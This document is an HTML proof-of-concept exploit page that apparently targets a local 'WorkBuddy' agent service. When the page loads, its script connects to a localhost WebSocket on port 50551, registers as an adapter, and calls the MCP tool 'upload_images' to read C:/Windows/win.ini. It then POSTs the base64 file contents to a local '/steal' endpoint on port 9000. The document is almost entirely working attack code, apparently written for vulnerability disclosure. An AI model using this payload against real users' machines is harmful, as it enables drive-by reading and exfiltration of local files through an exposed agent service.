<!DOCTYPE html><html><head><meta charset="UTF-8"><title>POC</title></head>
<body><h2>WorkBuddy Ardot POC</h2><div id="out"></div>
<script>
window.onload = () => setTimeout(run, 800);
const SESSION = "pwn-" + Date.now(); let ws = null;
function log(s){ document.getElementById('out').innerHTML += '<div>'+s+'</div>'; }
function emit(ev,d){ if(ws && ws.readyState===1) ws.send('42'+JSON.stringify([ev,d])); }
function run(){
  log('[*] connecting ws://127.0.0.1:50551');
  try { ws = new WebSocket('ws://127.0.0.1:50551/ws/adapters/?EIO=4&transport=websocket'); }
  catch(e){ log('[-] WS err: '+e); return; }
  ws.onerror = e => log('[-] WS error');
  ws.onmessage = e => {
    const d = e.data.toString();
    if(d.startsWith('0')) ws.send('40');
    else if(d.startsWith('40')){
      log('[+] socket.io connected, register');
      emit('message',{type:'register',role:'adapter-relay',metadata:{sessionId:SESSION}});
    }
    else if(d.includes('register_ack')){
      log('[+] adapter registered, read file');
      fetch('http://127.0.0.1:50551/api/v1/mcp',{method:'POST',
        headers:{'Content-Type':'application/json','Accept':'application/json, text/event-stream'},
        body:JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/call',
          params:{name:'upload_images',arguments:{items:[{nodeId:'1',filePath:'C:/Windows/win.ini'}]},
            _meta:{'workbuddy.ai/sessionId':SESSION}}})})
        .then(r=>r.text()).then(t=>log('[MCP] '+t.slice(0,150))).catch(e=>log('[-] fetch fail: '+e));
    }
    else if(d.includes('tool_request')){
      try{
        const pkt = JSON.parse(d.slice(2));
        const items = pkt[1]?.params?.items;
        if(items && items[0]?.data){
          const b64 = items[0].data;
          log('[+] FILE READ OK');
          // 外发到本机接收服务器
          try{
            fetch('http://127.0.0.1:9000/steal',{method:'POST',
              headers:{'Content-Type':'text/plain'},body:'WININI:'+b64});
            log('[+] exfil attempt to 127.0.0.1:9000');
          }catch(e2){ log('[-] exfil fail'); }
        }
      }catch(e3){}
    }
  };
}
</script></body></html>
